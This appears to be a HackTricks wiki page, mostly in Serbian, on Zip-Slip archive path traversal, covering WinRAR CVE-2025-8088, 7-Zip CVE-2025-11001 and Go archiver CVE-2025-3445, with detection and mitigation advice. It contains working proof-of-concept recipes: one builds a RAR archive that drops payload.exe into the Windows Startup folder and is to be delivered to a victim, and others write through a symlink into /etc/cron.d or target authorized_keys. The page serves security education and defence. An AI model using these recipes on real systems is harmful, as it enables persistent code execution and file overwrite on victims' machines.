# Archive Extraction Path Traversal ("Zip-Slip" / WinRAR CVE-2025-8088)

{{#include ../banners/hacktricks-training.md}}

## Pregled

Mnogi arhivski formati (ZIP, RAR, TAR, 7-ZIP, itd.) dozvoljavaju da svaki unos nosi svoju sopstvenu **unutrašnju putanju**. Kada alat za ekstrakciju slepo poštuje tu putanju, posebno oblikovano ime fajla koje sadrži `..` ili **apsolutnu putanju** (npr. `C:\Windows\System32\`) biće upisano van direktorijuma koji je korisnik izabrao.
Ova klasa ranjivosti je široko poznata kao *Zip-Slip* ili **archive extraction path traversal**.

Posledice variraju od prepisivanja proizvoljnih fajlova do direktnog postizanja **remote code execution (RCE)** ubacivanjem payload-a u **auto-run** lokaciju, kao što je Windows *Startup* folder.

## Osnovni uzrok

1. Napadač kreira arhivu u kojoj jedan ili više zaglavlja fajlova sadrže:
* Relativne sekvence prelaska direktorijuma (`..\..\..\Users\\victim\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\payload.exe`)
* Apsolutne putanje (`C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\payload.exe`)
* Ili pažljivo kreirane **symlinks** koje se rešavaju van ciljnog direktorijuma (uobičajeno u ZIP/TAR na *nix*).
2. Žrtva ekstrahuje arhivu koristeći ranjiv alat koji veruje ugrađenoj putanji (ili sledi symlinks) umesto da je sanitizuje ili primora izdvajanje ispod izabranog direktorijuma.
3. Fajl je upisan na lokaciju koju kontroliše napadač i biće izvršen/učitan sledeći put kada sistem ili korisnik aktivira tu putanju.

## Primer iz stvarnog sveta – WinRAR ≤ 7.12 (CVE-2025-8088)

WinRAR for Windows (including the `rar` / `unrar` CLI, the DLL and the portable source) nije validirao imena fajlova tokom ekstrakcije.
Zlonamerni RAR arhiv koji sadrži unos kao:
```text
..\..\..\Users\victim\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\payload.exe
```
bi se našao **izvan** odabranog izlaznog direktorijuma i unutar *Startup* foldera korisnika. Nakon prijave, Windows automatski izvršava sve što se tamo nalazi, pružajući *persistent* RCE.

### Izrada PoC arhive (Linux/Mac)
```bash
# Requires rar >= 6.x
mkdir -p "evil/../../../Users/Public/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
cp payload.exe "evil/../../../Users/Public/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/"
rar a -ep evil.rar evil/*
```
Korišćene opcije:
* `-ep`  – skladišti putanje fajlova tačno kako su date (ne skraćuj vodeći `./`).

Dostavite `evil.rar` žrtvi i uputite je da arhivu raspakuje pomoću ranjive verzije WinRAR-a.

### Zabeležena eksploatacija u stvarnom svetu

ESET je izvestio o RomCom (Storm-0978/UNC2596) spear-phishing kampanjama koje su slale RAR arhive koje zloupotrebljavaju CVE-2025-8088 za deploy prilagođenih backdoora i olakšavanje ransomware aktivnosti.

## Noviji slučajevi (2024–2025)

### 7-Zip ZIP symlink traversal → RCE (CVE-2025-11001 / ZDI-25-949)
* **Bug**: ZIP entries that are **symbolic links** were dereferenced during extraction, letting attackers escape the destination directory and overwrite arbitrary paths. User interaction is just *opening/extracting* the archive.
* **Affected**: 7-Zip 21.02–24.09 (Windows & Linux builds). Fixed in **25.00** (July 2025) and later.
* **Impact path**: Overwrite `Start Menu/Programs/Startup` or service-run locations → code runs at next logon or service restart.
* **Quick PoC (Linux)**:
```bash
mkdir -p out
ln -s /etc/cron.d evil
zip -y exploit.zip evil   # -y preserves symlinks
7z x exploit.zip -o/tmp/target   # vulnerable 7-Zip writes to /etc/cron.d
```
On a patched build `/etc/cron.d` won’t be touched; the symlink is extracted as a link inside /tmp/target.

### Go mholt/archiver Unarchive() Zip-Slip (CVE-2025-3445)
* **Bug**: `archiver.Unarchive()` follows `../` and symlinked ZIP entries, writing outside `outputDir`.
* **Affected**: `github.com/mholt/archiver` ≤ 3.5.1 (project now deprecated).
* **Fix**: Switch to `mholt/archives` ≥ 0.1.0 or implement canonical-path checks before write.
* **Minimal reproduction**:
```go
// go test . with archiver<=3.5.1
archiver.Unarchive("exploit.zip", "/tmp/safe")
// exploit.zip holds ../../../../home/user/.ssh/authorized_keys
```

## Saveti za detekciju

* **Static inspection** – Listajte stavke u arhivi i označite bilo koje ime koje sadrži `../`, `..\\`, *absolute paths* (`/`, `C:`) ili stavke tipa *symlink* čija je meta izvan direktorijuma za ekstrakciju.
* **Canonicalisation** – Osigurajte da `realpath(join(dest, name))` i dalje počinje sa `dest`. U suprotnom odbacite.
* **Sandbox extraction** – Raspakujte u privremeni direktorijum koristeći *siguran* extractor (npr. `bsdtar --safe --xattrs --no-same-owner`, 7-Zip ≥ 25.00) i verifikujte da rezultujuće putanje ostaju unutar direktorijuma.
* **Endpoint monitoring** – Alarmirajte na nove izvršne fajlove upisane u `Startup`/`Run`/`cron` lokacije ubrzo nakon što je arhiva otvorena pomoću WinRAR/7-Zip/etc.

## Mitigacija i hardening

1. **Update the extractor** – WinRAR 7.13+ i 7-Zip 25.00+ implementiraju sanitizaciju putanja/symlinkova. Ovi alati i dalje nemaju auto-update.
2. Raspakujte arhive koristeći “**Do not extract paths**” / “**Ignore paths**” kad je moguće.
3. Na Unixu spustite privilegije i mount-ujte **chroot/namespace** pre ekstrakcije; na Windows koristite **AppContainer** ili sandbox.
4. Ako pišete sopstveni kod, normalizujte sa `realpath()`/`PathCanonicalize()` **pre** kreiranja/upisa i odbacite svaku stavku koja izlazi iz odredišta.

## Dodatni pogođeni / istorijski slučajevi

* 2018 – Massive *Zip-Slip* advisory by Snyk affecting many Java/Go/JS libraries.
* 2023 – 7-Zip CVE-2023-4011 similar traversal during `-ao` merge.
* 2025 – HashiCorp `go-slug` (CVE-2025-0377) TAR extraction traversal in slugs (patch in v1.2).
* Any custom extraction logic that fails to call `PathCanonicalize` / `realpath` prior to write.

## References

- [Trend Micro ZDI-25-949 – 7-Zip symlink ZIP traversal (CVE-2025-11001)](https://www.zerodayinitiative.com/advisories/ZDI-25-949/)
- [JFrog Research – mholt/archiver Zip-Slip (CVE-2025-3445)](https://research.jfrog.com/vulnerabilities/archiver-zip-slip/)

{{#include ../banners/hacktricks-training.md}}
